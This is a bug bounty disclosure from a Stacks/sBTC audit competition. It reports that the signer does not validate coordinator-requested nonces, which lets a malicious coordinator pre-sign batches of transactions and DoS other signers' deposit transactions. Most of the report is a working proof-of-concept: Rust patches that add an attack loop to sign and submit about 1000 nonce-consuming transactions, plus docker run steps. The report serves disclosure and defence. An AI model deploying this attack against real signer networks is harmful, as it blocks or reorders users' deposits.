# #38551 \[BC-Medium] A signer can request stacks tx nonces in batches in advance and then DoS other si

**Submitted on Jan 6th 2025 at 14:39:45 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38551
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * API crash preventing correct processing of deposits

## Description

## Brief/Intro

When a signer acts as a coordinator, it will initiate some sBTC stacks contract calls.

The problem now is that the signer does not check the nonce of the stacks transaction requested by the coordinator. A malicious coordinator can request nonces in batches in advance, and then DoS their contract calls when other signers become coordinators.

For example, if the current nonce is 100, the attacker can request nonces 101...200 in advance when becoming a coordinator. Then, when another signer becomes a coordinator, the attacker submits a transaction with a nonce of 101 to DoS the current coordinator's transaction.

## Vulnerability Details

The `signer/src/transaction_signer.rs::handle_stacks_transaction_sign_request` code is as follows.

```rust
    async fn handle_stacks_transaction_sign_request(
        &mut self,
        request: &StacksTransactionSignRequest,
        bitcoin_chain_tip: &model::BitcoinBlockHash,
        origin_public_key: &PublicKey,
    ) -> Result<(), Error> {
        let instant = std::time::Instant::now();
        let validation_status = self
            .assert_valid_stacks_tx_sign_request(request, bitcoin_chain_tip, origin_public_key)
            .await;

        metrics::histogram!(
            Metrics::ValidationDurationSeconds,
            "blockchain" => STACKS_BLOCKCHAIN,
            "kind" => request.tx_kind(),
        )
        .record(instant.elapsed());
        metrics::counter!(
            Metrics::SignRequestsTotal,
            "blockchain" => STACKS_BLOCKCHAIN,
            "kind" => request.tx_kind(),
            "status" => if validation_status.is_ok() { "success" } else { "failed" },
        )
        .increment(1);
        validation_status?;

        // We need to set the nonce in order to get the exact transaction
        // that we need to sign.
        let wallet = SignerWallet::load(&self.context, bitcoin_chain_tip).await?;
        wallet.set_nonce(request.nonce);

        let multi_sig = MultisigTx::new_tx(&request.contract_tx, &wallet, request.tx_fee);
        let txid = multi_sig.tx().txid();

        debug_assert_eq!(txid, request.txid);

        let signature = crate::signature::sign_stacks_tx(multi_sig.tx(), &self.signer_private_key);

        let msg = message::StacksTransactionSignature { txid, signature };

        self.send_message(msg, bitcoin_chain_tip).await?;

        Ok(())
    }
```

It does not check `request.nonce` and set it to the wallet's nonce.

## Impact Details

The attacker can DoS other signers' Stacks transactions and can control whether deposits are executed or the order in which they are executed.

## References

None

## Proof of Concept

## Proof of Concept

1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
2. Patch `signer/src/config/mod.rs`, add attacker flag config

   ```diff
        /// The minimum bitcoin block height for which the sbtc signers will
        /// backfill bitcoin blocks to.
        pub sbtc_bitcoin_start_height: Option<u64>,
   +    /// @audit;
   +    pub audit_this_signer_is_attacker: Option<bool>,
    }
    
    impl Validatable for SignerConfig {
   ```
3. Patch `signer/src/main.rs`, load attacker flag

   ```diff
        );
    
        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config)?;
   +    let mut settings = Settings::new(args.config)?;
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
    
        // Open a connection to the signer db.
   ```
4. Patch `docker/docker-compose.yml`, add attacker flag

   ```diff
          - postgres-3
        environment:
          <<: *sbtc-signer-environment
   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   ```
5. Patch `signer/src/transaction_coordinator.rs`, add attack action.

   ```diff
        async fn construct_and_sign_stacks_sbtc_response_transactions(
            &mut self,
            chain_tip: &model::BitcoinBlockHash,
            bitcoin_aggregate_key: &PublicKey,
        ) -> Result<(), Error> {
            let wallet = SignerWallet::load(&self.context, chain_tip).await?;
            let stacks = self.context.get_stacks_client();
    
   +        if self.context.config().signer.audit_this_signer_is_attacker.is_some_and(|x| x) {
   +            tracing::info!("@audit; start attack");
   +
   +            use crate::stacks::contracts::RejectWithdrawalV1;
   +            let attack_contract_call = ContractCall::RejectWithdrawalV1(RejectWithdrawalV1 {
   +                request_id: 0,
   +                signer_bitmap: bitvec::array::BitArray::<_>::ZERO,
   +                deployer: self.context.config().signer.deployer,
   +            });
   +
   +            let mut nonce = stacks.get_account(wallet.address()).await?.nonce;
   +            let tx_fee = self
   +                .context
   +                .get_stacks_client()
   +                .estimate_fees(&wallet, &attack_contract_call, FeePriority::High)
   +                .await?;
   +
   +            let mut txs = Vec::new();
   +            for _ in 0..1000 {
   +                wallet.set_nonce(nonce);
   +                nonce += 1;
   +                let attack_multi_tx = MultisigTx::new_tx(&attack_contract_call, &wallet, tx_fee);
   +                let attack_sign_request = StacksTransactionSignRequest {
   +                    aggregate_key: *bitcoin_aggregate_key,
   +                    contract_tx: attack_contract_call.clone().into(),
   +                    nonce: attack_multi_tx.tx().get_origin_nonce(),
   +                    tx_fee: attack_multi_tx.tx().get_tx_fee(),
   +                    txid: attack_multi_tx.tx().txid(),
   +                };
   +
   +                match self.sign_stacks_transaction(attack_sign_request, attack_multi_tx, chain_tip, &wallet).await {
   +                    Ok(tx) => txs.push(tx),
   +                    Err(err) => {
   +                        tracing::info!("@audit; sign_stacks_transaction failed: {:?}", err);
   +                        break;
   +                    }
   +                }
   +            }
   +
   +            let mut i = 0;
   +            loop {
   +                if i == txs.len() {
   +                    tracing::info!("@audit; attack end");
   +                    break;
   +                }
   +
   +                match self.context.get_stacks_client().submit_tx(&txs[i]).await {
   +                    Ok(SubmitTxResponse::Acceptance(_)) => {
   +                        tracing::info!("@audit; submit_tx success, nonce {:?}", txs[i].get_origin_nonce());
   +                        i += 1;
   +                    },
   +                    Ok(SubmitTxResponse::Rejection(err)) => {
   +                        tracing::info!("@audit; submit_tx err: {:?}, continue", err);
   +                        match err.reason {
   +                            crate::stacks::api::RejectionReason::TooMuchChaining => i -= 1,
   +                            _ => i += 1,
   +                        }
   +                        continue;
   +                    },
   +                    Err(err) => {
   +                        tracing::info!("@audit; submit_tx err: {:?}, break", err);
   +                        break;
   +                    },
   +                }
   +
   +                tokio::time::sleep(Duration::from_secs(1)).await;
   +            }
   +
   +            return Ok(())
   +        }
   +
            // Fetch deposit and withdrawal requests from the database where
            // there has been a confirmed bitcoin transaction associated with
            // the request.
   ```
6. Run docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
7. Add [this code](https://gist.github.com/al-f4lc0n/6befe01b89669cfb756cf747d7cf030d) to `signer/src/bin/poc9.rs`
8. Patch `signer/Cargo.toml`, add `poc9` bin

   ```diff
   +[[bin]]
   +name = "poc9"
   +path = "src/bin/poc9.rs"
   ```
9. Waiting for the sBTC contract to be deployed. Then run the `poc9` tool. It will send 40 BTC to the signers BTC address and trigger deposits every 10 seconds

   ```sh
   cargo run -p signer --bin poc9
   ```
10. This PoC sets *sbtc-signer-3* as the attacker. Once it is *sbtc-signer-3*'s turn as the coordinator, it will request signatures for a batch of Stacks transactions with different nonces and submit them to the Stacks network every 1 second
11. Then, check the logs of *sbtc-signer-1* and *sbtc-signer-2*, and you will find that the deposits Stacks transactions they submitted failed due to `CONFLICTING_NONCE_IN_MEMPOOL`
